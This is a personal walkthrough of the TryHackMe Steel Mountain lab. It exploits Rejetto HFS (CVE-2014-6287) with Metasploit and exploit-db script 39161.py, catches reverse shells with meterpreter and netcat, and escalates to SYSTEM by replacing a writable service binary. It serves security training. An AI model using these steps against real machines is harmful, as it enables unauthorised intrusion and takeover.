# Steel Mountain
> Bradley Lubow (rnbochsr)

TryHackMe.com's Steel Mountain room. 

## Recon

### NMAP Results

```bash
sudo nmap -Pn -sS -p- -oN nmap.initial -T5 10.10.90.201                                                   130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-16 16:42 EDT
Nmap scan report for 10.10.90.201
Host is up (0.10s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown
49164/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 157.54 seconds
```

File server running on port 8080 is the Rejetto HttpFileServer (HFS). It is vulnerable to CVE-2014-6287 RCE. 
Remote Desktop Protocol running on port 3389.


## Initial Foothold

Use metasploit module for Rejetto HFS to get an initial foothold and shell on the target server. 
Set the RHOSTS, RPORT, and LHOST. You can change the LPORT or leave it as the default 4444. All other options can be left as is. 

There is no need to start a listener as the default payload calls back to metasploit. Running the exploit achieves a meterpreter reverse shell.


## Enumeration

```bash
meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: STEELMOUNTAIN\bill

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

We are looking for the user.txt flag. Listing the contents of the home directory didn't show it. I found it in the Desktop directory. 

```bash
meterpreter > dir
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

cat user.txt
b0[REDACTED]65
```

Additional enumeration done using the PowerUp.ps1 PowerShell script. 
```bash
meterpreter > upload PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
```
Note that the above command starts dot space. If you don't include that it will not work.

```bash
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...

ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>


[*] Checking service executable and argument permissions...

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'IObitUnSvr'


[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'


[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
```

### MSF Attempt #5 
The PowerUp.ps1 script should have noted a behavior called CanRestart. It didn't I tried restarting the script, restarting the target, restarting the room, using the attackbox, using the web Kali attack machine, and my own Kali VM. Nothing seemed to work. 

```bash
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.43.37:4444 
[*] Using URL: http://0.0.0.0:8080/Yakh80
[*] Local IP: http://10.10.43.37:8080/Yakh80
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /Yakh80
[*] Sending stage (176195 bytes) to 10.10.235.182
[*] Meterpreter session 1 opened (10.10.43.37:4444 -> 10.10.235.182:49281) at 2022-04-21 17:16:35 +0000
[!] Tried to delete %TEMP%\iNBsGTDHB.vbs, unknown result
[*] Server stopped.

meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
meterpreter > cd C:\\
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode                Size                Type  Last modified                    Name
----                ----                ----  -------------                    ----
40777/rwxrwxrwx     0                   dir   2013-08-22 15:39:31 +0000        $Recycle.Bin
100666/rw-rw-rw-    1                   fil   2013-08-22 15:46:48 +0000        BOOTNXT
40777/rwxrwxrwx     0                   dir   2013-08-22 14:48:41 +0000        Documents and Settings
100666/rw-rw-rw-    3162859             fil   2020-10-12 19:06:09 +0000        EC2-Windows-Launch.zip
40777/rwxrwxrwx     0                   dir   2013-08-22 15:39:30 +0000        PerfLogs
40555/r-xr-xr-x     4096                dir   2013-08-22 13:36:16 +0000        Program Files
40777/rwxrwxrwx     4096                dir   2013-08-22 13:36:16 +0000        Program Files (x86)
40777/rwxrwxrwx     4096                dir   2013-08-22 13:36:16 +0000        ProgramData
40777/rwxrwxrwx     0                   dir   2019-09-26 14:04:18 +0000        System Volume Information
40555/r-xr-xr-x     4096                dir   2013-08-22 13:36:16 +0000        Users
40777/rwxrwxrwx     24576               dir   2013-08-22 13:36:16 +0000        Windows
100444/r--r--r--    398356              fil   2013-08-22 15:46:48 +0000        bootmgr
40777/rwxrwxrwx     0                   dir   2019-09-26 14:17:28 +0000        inetpub
100666/rw-rw-rw-    13182               fil   2020-10-12 19:06:12 +0000        install.ps1
15601544/r-xr--r--  162407247631122415  fif   5155485108-10-20 02:31:28 +0000  pagefile.sys

meterpreter > dir
Listing: C:\
============

Mode                Size                Type  Last modified                    Name
----                ----                ----  -------------                    ----
40777/rwxrwxrwx     0                   dir   2013-08-22 15:39:31 +0000        $Recycle.Bin
100666/rw-rw-rw-    1                   fil   2013-08-22 15:46:48 +0000        BOOTNXT
40777/rwxrwxrwx     0                   dir   2013-08-22 14:48:41 +0000        Documents and Settings
100666/rw-rw-rw-    3162859             fil   2020-10-12 19:06:09 +0000        EC2-Windows-Launch.zip
40777/rwxrwxrwx     0                   dir   2013-08-22 15:39:30 +0000        PerfLogs
40555/r-xr-xr-x     4096                dir   2013-08-22 13:36:16 +0000        Program Files
40777/rwxrwxrwx     4096                dir   2013-08-22 13:36:16 +0000        Program Files (x86)
40777/rwxrwxrwx     4096                dir   2013-08-22 13:36:16 +0000        ProgramData
40777/rwxrwxrwx     0                   dir   2019-09-26 14:04:18 +0000        System Volume Information
40555/r-xr-xr-x     4096                dir   2013-08-22 13:36:16 +0000        Users
40777/rwxrwxrwx     24576               dir   2013-08-22 13:36:16 +0000        Windows
100444/r--r--r--    398356              fil   2013-08-22 15:46:48 +0000        bootmgr
40777/rwxrwxrwx     0                   dir   2019-09-26 14:17:28 +0000        inetpub
100666/rw-rw-rw-    13182               fil   2020-10-12 19:06:12 +0000        install.ps1
15601544/r-xr--r--  162407247631122415  fif   5155485108-10-20 02:31:28 +0000  pagefile.sys

meterpreter > cd Users
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2019-09-26 14:11:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2013-08-22 14:48:41 +0000  All Users
40555/r-xr-xr-x   8192  dir   2013-08-22 13:36:16 +0000  Default
40777/rwxrwxrwx   0     dir   2013-08-22 14:48:41 +0000  Default User
40555/r-xr-xr-x   4096  dir   2013-08-22 13:36:16 +0000  Public
40777/rwxrwxrwx   8192  dir   2019-09-27 06:29:03 +0000  bill
100666/rw-rw-rw-  174   fil   2013-08-22 15:39:32 +0000  desktop.ini

meterpreter > cd bill
meterpreter > ls
Listing: C:\Users\bill
======================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:24 +0000  .groovy
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  AppData
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Application Data
40555/r-xr-xr-x   0        dir   2019-09-27 11:07:07 +0000  Contacts
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Cookies
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Desktop
40555/r-xr-xr-x   4096     dir   2019-09-27 06:29:03 +0000  Documents
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Downloads
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Favorites
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Links
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Local Settings
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Music
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  My Documents
100666/rw-rw-rw-  524288   fil   2019-09-27 06:29:03 +0000  NTUSER.DAT
100666/rw-rw-rw-  1048576  fil   2019-09-27 16:09:04 +0000  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576  fil   2019-09-27 16:09:05 +0000  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576  fil   2019-09-27 16:09:05 +0000  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536    fil   2019-09-27 16:09:04 +0000  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.blf
100666/rw-rw-rw-  65536    fil   2019-09-27 06:29:03 +0000  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TM.blf
100666/rw-rw-rw-  524288   fil   2019-09-27 06:29:03 +0000  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2019-09-27 06:29:03 +0000  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  NetHood
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Pictures
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  PrintHood
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Recent
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Saved Games
40555/r-xr-xr-x   0        dir   2019-09-27 11:07:07 +0000  Searches
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  SendTo
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Start Menu
40777/rwxrwxrwx   0        dir   2019-09-27 06:29:03 +0000  Templates
40555/r-xr-xr-x   0        dir   2019-09-27 06:29:03 +0000  Videos
100666/rw-rw-rw-  405504   fil   2019-09-27 06:29:03 +0000  ntuser.dat.LOG1
100666/rw-rw-rw-  131072   fil   2019-09-27 06:29:03 +0000  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2019-09-27 06:29:03 +0000  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 11:07:07 +0000  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 12:42:38 +0000  user.txt

meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 483.72 KiB of 483.72 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...

ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>


[*] Checking service executable and argument permissions...

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'IObitUnSvr'


[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'


[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...

** END OF SCAN **
```

It seems that no matter how I try to run this script, I can't get it to show the `CanRestart` data. Then when I try to simply stop the service, replace the binary with my malicious script, and restart the service, it doesn't work. I am sure it is probably something to do with how PowerShell works. I must not be stopping the service so I can't access the file. More research into this is required. 


### Task 4 - Exploit without Metasploit

Use script 39161.py from Exploit-db.com. Edit script:
* Set local IP
* Set local port
Use a web server to transfer Netcat binary, *nc.exe*. 
* `sudo python3 -m http.server 80 ` // Note that you must start web seerver with `sudo` or you get an error because you need a server running on port 80. 
Start a listener for the callback.
* `nc -lvnp 4444`
Fire the exploit script. 
* `python3 39161.py <IP> <port>` The IP and port must match what you enter in the 39161.py script above. 
At this point the target server should have called-back to your attacking machine. 

**Frustration** 
I've tried multiple times to make this work and just like with the PowerUp.ps1 script and exploiting the ASCService.exe overwrite, I couldn't get this to work. It has been very frustrating!

I'm going to try a hybrid approach to see if I can get the root flag. 
* Get my foothold using Metasploit. That has worked almost flawlessly. 
* Transfer the files to the target via PowerShell.
* Stop the service.
* Rename the files as needed.
* Restart the service to run the exploit.


#### Success!!

Got my foothold using Metasploit. Meterpreter shell.
Start PowerShell in meterpreter 
* `load powershell`
* `powershell_shell`
* Stop service `Stop-Service AdvancedSystemCareService9`
* Move into ASC directory `cd 'C:\Program Files (x86)\IObit\Advanced SystemCare'`
* Renaming, moving, deleting the ASCService.exe didn't work. So I just tried to upload my version hoping it would overwrite the existing file. It did! 
	* Exit out of PowerShell `CTRL-C`
	* `upload ASCService.exe`
	* File's last modified date didn't change but it was now the same size as my exploit. 
* Start my listener `nc -lvnp 4444`
* Restart the service
	* `powershell_shell`
	* `Start-Service AdvancedSystemCareService9`
	* The service didn't start, obviously, and generated an error, but...
* Root shell call-back to my listener! 
	* `cd 'C:\Users\Administrator\Desktop`
	* `type root.txt`

The final piece of the puzzle!
root.txt flag: 9a[REDACTED]80

### Worthy of note

1. I am not sure why the PowerUp.ps1 script never displayed the `CanRestart` data. 
2. I used the service exploit because the room told me to and I wanted to see if I could complete the exploit and priviledge escalation. 
3. I ended up using my own hybrid solution. It was pretty, but it worked. 
4. I didn't expect the upload of the malicious file to work. I was pleasantly surprised when it did. 
5. Nothing like the feeling of catching a reverse shell!

